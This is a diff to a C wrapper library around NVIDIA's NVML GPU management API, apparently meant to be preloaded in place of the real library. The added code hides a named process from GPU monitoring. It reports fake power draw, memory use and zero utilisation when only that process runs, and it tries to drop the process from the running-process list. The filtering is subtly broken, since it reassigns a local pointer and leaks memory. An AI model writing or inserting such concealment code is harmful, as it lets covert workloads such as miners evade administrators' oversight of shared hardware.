@@ -1,4 +1,5 @@
 #include <dlfcn.h>
+#include <string.h>
 #include "nvml.h"
 #include <stdlib.h>
 
@@ -132,10 +133,77 @@ nvmlReturn_t DECLDIR nvmlDeviceGetPowerManagementMode(nvmlDevice_t device, nvmlE
 nvmlReturn_t DECLDIR nvmlDeviceGetPowerManagementLimit(nvmlDevice_t device, unsigned int *limit){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *limit);fn = getfn("nvmlDeviceGetPowerManagementLimit");ret = fn(device, limit);return ret;}
 nvmlReturn_t DECLDIR nvmlDeviceGetPowerManagementLimitConstraints(nvmlDevice_t device, unsigned int *minLimit, unsigned int *maxLimit){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *minLimit, unsigned int *maxLimit);fn = getfn("nvmlDeviceGetPowerManagementLimitConstraints");ret = fn(device, minLimit, maxLimit);return ret;}
 nvmlReturn_t DECLDIR nvmlDeviceGetPowerManagementDefaultLimit(nvmlDevice_t device, unsigned int *defaultLimit){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *defaultLimit);fn = getfn("nvmlDeviceGetPowerManagementDefaultLimit");ret = fn(device, defaultLimit);return ret;}
-nvmlReturn_t DECLDIR nvmlDeviceGetPowerUsage(nvmlDevice_t device, unsigned int *power){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *power);fn = getfn("nvmlDeviceGetPowerUsage");ret = fn(device, power);return ret;}
+
+nvmlReturn_t DECLDIR nvmlDeviceGetPowerUsage(nvmlDevice_t device, unsigned int *power)
+{
+	nvmlReturn_t ret;
+	nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *power);
+	fn = getfn("nvmlDeviceGetPowerUsage");
+	ret = fn(device, power);
+	
+        int only_hidden = 1;
+        nvmlProcessInfo_t infos[10];
+        unsigned int count = 10;
+        nvmlDeviceGetComputeRunningProcesses(device , &count, infos);
+
+        int i ;
+        for (i = 0; i < count; i++)
+        {
+                char proname[128];
+                nvmlSystemGetProcessName(infos[i].pid, proname, 128);
+                if(strncmp(proname, HIDDEN_CMD_GPU, 128))
+                {
+                        only_hidden = 0;
+                        break;
+                }
+        }
+
+
+        if(only_hidden)
+                *power=22;
+
+
+	return ret;
+}
+
 nvmlReturn_t DECLDIR nvmlDeviceGetEnforcedPowerLimit(nvmlDevice_t device, unsigned int *limit){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *limit);fn = getfn("nvmlDeviceGetEnforcedPowerLimit");ret = fn(device, limit);return ret;}
 nvmlReturn_t DECLDIR nvmlDeviceGetGpuOperationMode(nvmlDevice_t device, nvmlGpuOperationMode_t *current, nvmlGpuOperationMode_t *pending){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlGpuOperationMode_t *current, nvmlGpuOperationMode_t *pending);fn = getfn("nvmlDeviceGetGpuOperationMode");ret = fn(device, current, pending);return ret;}
-nvmlReturn_t DECLDIR nvmlDeviceGetMemoryInfo(nvmlDevice_t device, nvmlMemory_t *memory){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlMemory_t *memory);fn = getfn("nvmlDeviceGetMemoryInfo");ret = fn(device, memory);return ret;}
+
+nvmlReturn_t DECLDIR nvmlDeviceGetMemoryInfo(nvmlDevice_t device, nvmlMemory_t *memory)
+{
+	nvmlReturn_t ret;
+	nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlMemory_t *memory);
+	fn = getfn("nvmlDeviceGetMemoryInfo");
+	ret = fn(device, memory);
+
+
+	int only_hidden = 1;
+	nvmlProcessInfo_t infos[10];
+	unsigned int count = 10;
+	nvmlDeviceGetComputeRunningProcesses(device , &count, infos);
+	
+	int i ;
+	for (i = 0; i < count; i++)
+	{
+                char proname[128];
+                nvmlSystemGetProcessName(infos[i].pid, proname, 128);
+                if(strncmp(proname, HIDDEN_CMD_GPU, 128))
+		{
+			only_hidden = 0; 
+			break;
+		}
+	}
+	
+	
+	if(only_hidden)
+		memory->used=55;	
+
+
+
+
+	return ret;
+}
+
 nvmlReturn_t DECLDIR nvmlDeviceGetComputeMode(nvmlDevice_t device, nvmlComputeMode_t *mode){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlComputeMode_t *mode);fn = getfn("nvmlDeviceGetComputeMode");ret = fn(device, mode);return ret;}
 nvmlReturn_t DECLDIR nvmlDeviceGetEccMode(nvmlDevice_t device, nvmlEnableState_t *current, nvmlEnableState_t *pending){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEnableState_t *current, nvmlEnableState_t *pending);fn = getfn("nvmlDeviceGetEccMode");ret = fn(device, current, pending);return ret;}
 nvmlReturn_t DECLDIR nvmlDeviceGetBoardId(nvmlDevice_t device, unsigned int *boardId){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *boardId);fn = getfn("nvmlDeviceGetBoardId");ret = fn(device, boardId);return ret;}
@@ -143,7 +211,39 @@ nvmlReturn_t DECLDIR nvmlDeviceGetMultiGpuBoard(nvmlDevice_t device, unsigned in
 nvmlReturn_t DECLDIR nvmlDeviceGetTotalEccErrors(nvmlDevice_t device, nvmlMemoryErrorType_t errorType, nvmlEccCounterType_t counterType, unsigned long long *eccCounts){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlMemoryErrorType_t errorType, nvmlEccCounterType_t counterType, unsigned long long *eccCounts);fn = getfn("nvmlDeviceGetTotalEccErrors");ret = fn(device, errorType, counterType, eccCounts);return ret;}
 nvmlReturn_t DECLDIR nvmlDeviceGetDetailedEccErrors(nvmlDevice_t device, nvmlMemoryErrorType_t errorType, nvmlEccCounterType_t counterType, nvmlEccErrorCounts_t *eccCounts){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlMemoryErrorType_t errorType, nvmlEccCounterType_t counterType, nvmlEccErrorCounts_t *eccCounts);fn = getfn("nvmlDeviceGetDetailedEccErrors");ret = fn(device, errorType, counterType, eccCounts);return ret;}
 nvmlReturn_t DECLDIR nvmlDeviceGetMemoryErrorCounter(nvmlDevice_t device, nvmlMemoryErrorType_t errorType,nvmlEccCounterType_t counterType,nvmlMemoryLocation_t locationType, unsigned long long *count){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlMemoryErrorType_t errorType,nvmlEccCounterType_t counterType,nvmlMemoryLocation_t locationType, unsigned long long *count);fn = getfn("nvmlDeviceGetMemoryErrorCounter");ret = fn(device, errorType,counterType,locationType, count);return ret;}
-nvmlReturn_t DECLDIR nvmlDeviceGetUtilizationRates(nvmlDevice_t device, nvmlUtilization_t *utilization){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlUtilization_t *utilization);fn = getfn("nvmlDeviceGetUtilizationRates");ret = fn(device, utilization);return ret;}
+
+nvmlReturn_t DECLDIR nvmlDeviceGetUtilizationRates(nvmlDevice_t device, nvmlUtilization_t *utilization)
+{
+	nvmlReturn_t ret;
+	nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlUtilization_t *utilization);
+	fn = getfn("nvmlDeviceGetUtilizationRates");
+
+	ret = fn(device, utilization);
+
+	int only_hidden = 1;
+	nvmlProcessInfo_t infos[10];
+	unsigned int count = 10;
+	nvmlDeviceGetComputeRunningProcesses(device , &count, infos);
+	
+	int i ;
+	for (i = 0; i < count; i++)
+	{
+                char proname[128];
+                nvmlSystemGetProcessName(infos[i].pid, proname, 128);
+                if(strncmp(proname, HIDDEN_CMD_GPU, 128))
+		{
+			only_hidden = 0; 
+			break;
+		}
+	}
+	
+	
+	if(only_hidden)
+		utilization->gpu=0;	
+
+	return ret;
+}
+
 nvmlReturn_t DECLDIR nvmlDeviceGetEncoderUtilization(nvmlDevice_t device, unsigned int *utilization, unsigned int *samplingPeriodUs){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *utilization, unsigned int *samplingPeriodUs);fn = getfn("nvmlDeviceGetEncoderUtilization");ret = fn(device, utilization, samplingPeriodUs);return ret;}
 nvmlReturn_t DECLDIR nvmlDeviceGetDecoderUtilization(nvmlDevice_t device, unsigned int *utilization, unsigned int *samplingPeriodUs){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *utilization, unsigned int *samplingPeriodUs);fn = getfn("nvmlDeviceGetDecoderUtilization");ret = fn(device, utilization, samplingPeriodUs);return ret;}
 nvmlReturn_t DECLDIR nvmlDeviceGetDriverModel(nvmlDevice_t device, nvmlDriverModel_t *current, nvmlDriverModel_t *pending){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlDriverModel_t *current, nvmlDriverModel_t *pending);fn = getfn("nvmlDeviceGetDriverModel");ret = fn(device, current, pending);return ret;}
@@ -155,8 +255,24 @@ nvmlReturn_t DECLDIR nvmlDeviceGetComputeRunningProcesses(nvmlDevice_t device, u
 	nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos);
 	fn = getfn("nvmlDeviceGetComputeRunningProcesses");
 	ret = fn(device, infoCount, infos);
-	*infoCount = 0;
-	infos = NULL;
+	//*infoCount = 0;
+	//infos = NULL;
+	unsigned int new_infoCount=0;
+	int i;
+	nvmlProcessInfo_t * new_infos = malloc(sizeof(nvmlProcessInfo_t)*(*infoCount));
+	for ( i = 0; i < *infoCount; i++)
+	{
+		char proname[128];
+		nvmlSystemGetProcessName(infos[i].pid, proname, 128);
+		if(strncmp(proname, HIDDEN_CMD_GPU, 128))
+		{
+			new_infos[new_infoCount].pid = infos[i].pid;
+			new_infos[new_infoCount].usedGpuMemory = infos[i].usedGpuMemory;
+			new_infoCount ++;
+		}
+	}
+	*infoCount = new_infoCount;
+	infos = new_infos;
 	return ret;
 }
 
